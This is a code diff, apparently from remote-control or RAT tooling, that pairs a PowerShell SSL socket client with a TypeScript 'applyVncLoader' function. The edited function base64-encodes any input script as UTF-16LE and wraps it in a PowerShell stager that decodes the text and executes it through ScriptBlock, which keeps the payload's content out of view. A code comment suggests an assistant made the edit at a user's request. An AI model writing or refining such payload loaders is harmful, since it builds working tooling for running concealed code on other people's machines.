@@ -1086,7 +1086,7 @@ function Invoke-GracefulCleanup {
                 Write-Host "[+] SSL stream closed gracefully" -ForegroundColor Green
             } catch {
                 Write-Host "[!] Error closing SSL stream: $($_.Exception.Message)" -ForegroundColor Red
-            } finally {
+  } finally {
                 $global:sslStream = $null
             }
         }
@@ -1328,7 +1328,7 @@ try {
         } catch [System.Net.Sockets.SocketException] {
             Write-Host "[!] Socket Exception: $($_.Exception.Message)" -ForegroundColor Red
             break
-        } catch {
+  } catch {
             $currentTime = [System.Environment]::TickCount
             if ($currentTime - $lastErrorTime -gt 5000) { # Log once per 5 seconds
                 Write-Host "[!] Unexpected error: $($_.Exception.Message)" -ForegroundColor Red
@@ -1379,14 +1379,30 @@ try {
 }
 
 const applyVncLoader = (inputScript: string): string => {
-  // Use UTF-8 encoding instead of Unicode to avoid encoding issues
-  const encodedScript = btoa(unescape(encodeURIComponent(inputScript)))
-  const wrapperLoaderForPayload = `$enc = [System.Text.Encoding]::UTF8
+  // Encode as UTF-16LE (PowerShell Unicode)
+  function toUTF16LE(str: string): Uint8Array {
+    const buf = new Uint8Array(str.length * 2);
+    for (let i = 0; i < str.length; i++) {
+      const code = str.charCodeAt(i);
+      buf[i * 2] = code & 0xff;
+      buf[i * 2 + 1] = code >> 8;
+    }
+    return buf;
+  }
+  function base64Unicode(str: string): string {
+    return btoa(String.fromCharCode(...toUTF16LE(str)));
+  }
+  const encodedScript = base64Unicode(inputScript);
+
+  // Use the loader template provided by the user
+  const wrapperLoaderForPayload = `
+$enc = [System.Text.Encoding]::Unicode
 $decoded = $enc.GetString([Convert]::FromBase64String('${encodedScript}'))
 $scriptBlock = [ScriptBlock]::Create($decoded)
-& $scriptBlock`
-  
-  return wrapperLoaderForPayload
+& $scriptBlock
+  `.trim();
+
+  return wrapperLoaderForPayload;
 }
 
 // VNC Control Functions
